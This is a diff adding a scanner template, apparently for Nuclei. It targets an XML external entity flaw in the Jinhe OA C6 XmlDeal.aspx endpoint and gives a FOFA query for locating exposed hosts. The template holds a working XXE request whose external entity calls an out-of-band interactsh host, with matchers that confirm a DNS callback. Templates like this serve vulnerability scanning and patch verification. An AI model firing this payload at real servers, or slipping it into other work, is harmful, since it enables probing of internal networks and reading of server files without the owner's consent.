@@ -1,0 +1,29 @@
+id: jinheoa-xxe
+info:
+  name: "金和OAC6 XmlDeal.aspx 接口XML外部实体注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/C6/WebResource.axd"
+          金和C6协同管理应用软件基于精确管理模型架构，提供集团化应用及信息门户定制功能。其XmlDeal.aspx接口在处理XML数据时未正确限制外部实体引用，攻击者可通过构造恶意XML请求利用该漏洞探测内网结构或读取服务器上的敏感文件。
+  tags: 金和OAC6
+http:
+- raw:
+  - |
+    POST /c6/JHSoft.Web.Message/XmlDeal.aspx HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+    Content-Type: application/Xml
+
+    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
